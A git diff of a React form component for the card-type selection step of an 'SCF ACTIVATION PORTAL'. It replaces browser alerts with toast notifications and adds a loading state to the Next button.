@@ -1,6 +1,8 @@
 import { useForm } from "react-hook-form";
 import { useNavigate } from "react-router-dom";
 import { FaArrowRight } from "react-icons/fa";
+import { toast } from "react-toastify";
+import { useState } from "react";
 
 function Stepi({ nextStep }) {
   const {
@@ -12,14 +14,19 @@ function Stepi({ nextStep }) {
     defaultValues: { cardType: "" },
   });
   const navigate = useNavigate();
+  const [isLoading, setIsLoading] = useState(false);
 
   const onSubmit = (data) => {
+    setIsLoading(true);
     if (!data.cardType) {
-      alert("Please select a card type.");
+      toast.error("Please select a card type.");
+      setIsLoading(false);
       return;
     }
+    toast.success("Card type selected!");
     nextStep();
     navigate("/stepii");
+    setIsLoading(false);
   };
 
   return (
@@ -31,7 +38,7 @@ function Stepi({ nextStep }) {
         SCF ACTIVATION PORTAL
       </h2>
       <div style={{ textAlign: "left" }}>
-        <p>Select the card type</p>
+        <p>Select card type</p>
         <label
           style={{ display: "flex", alignItems: "center", marginBottom: "8px" }}
         >
@@ -77,8 +84,10 @@ function Stepi({ nextStep }) {
           alignItems: "center",
           justifyContent: "center",
         }}
+        disabled={isLoading}
       >
-        Next Step <FaArrowRight style={{ marginLeft: "8px" }} />
+        {isLoading ? "Loading..." : "Next Step"}{" "}
+        <FaArrowRight style={{ marginLeft: "8px" }} />
       </button>
     </form>
   );
